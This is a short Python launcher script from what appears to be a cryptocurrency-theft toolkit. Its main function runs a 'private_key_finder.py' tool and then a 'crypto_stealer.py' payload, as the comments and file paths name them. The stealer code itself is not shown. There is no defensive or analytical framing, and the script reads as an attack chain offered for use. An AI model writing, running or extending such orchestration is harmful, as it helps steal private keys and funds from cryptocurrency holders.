import subprocess
import os

def main():
    # Run the private key finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "private_key_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the crypto stealer
    stealer_path = os.path.join(os.path.dirname(__file__), "payloads", "crypto_stealer.py")
    subprocess.run(["python3", stealer_path])

if __name__ == "__main__":
    main()
